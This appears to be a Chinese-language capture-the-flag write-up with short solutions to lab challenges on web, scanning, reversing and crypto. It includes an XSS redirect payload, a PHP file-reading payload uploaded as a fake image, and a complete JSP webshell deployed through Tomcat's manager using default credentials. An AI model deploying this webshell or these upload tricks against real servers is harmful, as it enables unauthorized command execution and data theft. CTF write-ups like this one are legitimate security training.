## QR Code

打开就能看到二维码，然后用PS把左下角补上（一个方框）

## calculator

nc连上，发现要计算一道很长的数学题，果断用python脚本

```
from pwn import *
import numexpr

io = remote('10.214.160.13', 11002)
# print(io.recvuntil('='))
eq = ''
while not eq.startswith('AAA'):
    eq = io.recv()
    eq = eq.strip()
    print(eq)
    print(eq[0])
    if eq[0].isdigit():
        re = numexpr.evaluate(eq.split('=')[0])
        print(re)
        io.sendline(str(re))
# io.interactive()
```

## linkedlist

首先要计算一个字符串的md5，可以上[这个网站](https://www.md5hashgenerator.com/)，然后我们得到
![](imgs/memcache.png)

然后执行python脚本得到flag
```
from pymemcache.client.base import Client

client = Client(('10.214.160.13', <port>))
result = client.get('start')
while result != '1':
    print(result)
    result = client.get(result)
```

## EasyWeb

顾名思义，很简单的web题目，
第一关，用chrome的inspect功能或者view page source得到相应文件内含第二关网址
第二关，有个输入框和按钮，点击按钮出现“你从哪里来”，然后自动跳回之前的页面，这里我们在输入框中输入 `<script> window.location="3rd.php" </script>` 即可解决，进入第三关
第三关，有个按钮，点击进入一个页面，然而没有任何有用信息，这时想到看http的response，chrome inspect->network->看到response headers上有信息
![](easyweb.png)
最后，修改下button属性和script得到flag

## SQL Injuection

用sqlmap可以解出

## Scan

nmap解出一个端口，到指定网站，然后用DirBuster破解（不需要recursive)

## git leak

用githack解出

## dangerous flask

修改女神的value，进入traceback，得到flag

## php include

将
```
#!php
<?php
$html=file_get_contents('flag.php');
echo $html;
eval("echo %html");
?>
```
存为`evil.jpg`上传，然后首页的f改为图片上传得到的url，看下源码，就得到flag了


## War of tomcat

登录url/manager,发现tomcat管理登录，随便网上搜一下发现默认用户名密码都是tomcat，接下来写一个jsp改成war上传，我写的是这样子的：
```
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

我用的是`zip index.jsp webshell.war` 因为没有wsl下没找到`jar`这个命令


## flag403

TBC

## Reverse1

TBC

## apk01 baby

dex2jar + jd-gui 没有任何难度（

## Simple RSA

见[脚本](crack.py)

## Format String

TBC
